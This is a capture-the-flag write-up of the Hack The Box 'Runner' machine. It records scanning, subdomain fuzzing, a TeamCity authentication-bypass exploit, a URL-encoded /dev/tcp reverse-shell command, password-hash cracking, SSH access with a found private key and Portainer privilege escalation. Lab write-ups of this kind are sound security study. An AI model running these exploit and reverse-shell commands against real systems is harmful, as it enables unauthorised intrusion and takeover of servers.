**Ping** 
![[Pasted image 20240711165751.png]]

Nmap Scans
```
mapit 10.10.11.13
```
 
 Nmap Default Scan
 ![[Pasted image 20240711165848.png]]

Nmap Service and Script Scan
![[Pasted image 20240711165928.png]]

Nmap All Port Scan
![[Pasted image 20240711170334.png]]

On Port 80 http://runner.htb
![[Pasted image 20240711170252.png]]

On Port 8000 http://runner.htb:8000
![[Pasted image 20240711180522.png]]

Gobuster Scan for port 8000, nothing on Port 80
```
gobuster dir -u http://runner.htb:8000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,aspx -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster.txt
```
![[Pasted image 20240711180431.png]]

On /version
![[Pasted image 20240711180611.png]]

On /health
![[Pasted image 20240711180634.png]]


Tried a of of stuff, but no progress even after subdomain enumeration, But the website is the clue....

Ahaaan....How about using Cewl for create a custom wordlist form port 80, will use that as a word list and try directory and subdomain enumeration

Cewl list
```
cewl http://runner.htb/ -w cewl.list
```
![[Pasted image 20240711181438.png]]

Will use ffuf to sub domain enumeration
```
ffuf -w cewl.list -u http://runner.htb -H "Host: FUZZ.runner.htb" -fs 154
```
![[Pasted image 20240711181340.png]]
Found it TeamCity.runner.htb it is....!

Cool...! http://teamcity.runner.htb
![[Pasted image 20240711181627.png]]

Found exploit for Team city https://www.exploit-db.com/exploits/51884
![[Pasted image 20240711183755.png]]

We can use this exploit to create a user with admin privilege
```
python3 exp1.py -u http://teamcity.runner.htb
```
![[Pasted image 20240711183826.png]]
Will login with the cred 
**Username: city_adminPF0P**
**Password: Main_password!!****

Booom, Admin dashboard
![[Pasted image 20240711183919.png]]

Now we gonna use another exploit for rce https://github.com/Zyad-Elsayed/CVE-2023-42793 
Download the rce.py and execute it
![[Pasted image 20240711184026.png]]

![[Pasted image 20240711184106.png]]

We Already have token from our previous exploit, will use that here for RCE
```
python rce.py -u http://target.com -t token -c "whoami"
```
![[Pasted image 20240711184338.png]]





Will get a reverse shell
```
python3 rce.py -u http://teamcity.runner.htb -t token -c '"/bin/bash"&params="-c"&params="sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.6%2F443%200%3E%261"'
```
![[Pasted image 20240711184231.png]]

Will check our nc listener
![[Pasted image 20240711184259.png]]
Got it...!

But here there is no flag, I guess this might be a container
![[Pasted image 20240711184803.png]]

Gobuster Scan for sub domain
```
gobuster dir -u http://teamcity.runner.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,aspx -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster_team.txt
```
![[Pasted image 20240711185607.png]]

I can see the admin page in http://teamcity.runner.htb/admin/admin.html
![[Pasted image 20240711185745.png]]

Found something Intresting
![[Pasted image 20240711190113.png]]

Will analyze the backup file, I have downloaded and unzipped the file
![[Pasted image 20240711190407.png]]
![[Pasted image 20240711191206.png]]

Found some password hashes, will crack it using John
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
![[Pasted image 20240711194519.png]]

But can't ssh with this password with both usernames john and mathew

Will enumerate further, then found id_rsa
![[Pasted image 20240711195146.png]]

Will decode and find who's private key
![[Pasted image 20240711195255.png]]
Can see the user, it is john.....!

Will ssh now 
```
ssh -i id_rsa john@runner.htb
```
![[Pasted image 20240711195504.png]]
Finalyyyyy....!

User.txt
![[Pasted image 20240711195604.png]]


Will Jump To Privilege Escalation...>!

We can See another subdomain in hosts file
![[Pasted image 20240711200252.png]]

Will add it to our hosts file and enumerate it
![[Pasted image 20240711200425.png]]

Will use matthew cred here....it worked....!
![[Pasted image 20240711200529.png]]

Found privilege escalation technique in portainer using this link https://rioasmara.com/2021/08/15/use-portainer-for-privilege-escalation/
Can see some images
![[Pasted image 20240711200822.png]]

Setting up container and volume
Image: **sha256:ca2b0f26964cf2e80ba3e084d5983dab293fdb87485dc6445f3f7bbfc89d7459**
Creating a Volume
![[Pasted image 20240711202918.png]]
![[Pasted image 20240711202936.png]]
Creating a Container
![[Pasted image 20240711202711.png]]
Adding the volume
![[Pasted image 20240711202153.png]]
![[Pasted image 20240711203122.png]]

Will access the container via console
![[Pasted image 20240711203157.png]]

![[Pasted image 20240711203227.png]]
Connect it....!

Rooted......!
![[Pasted image 20240711203300.png]]

Root.txt
![[Pasted image 20240711203521.png]]




Done with Runner.....:)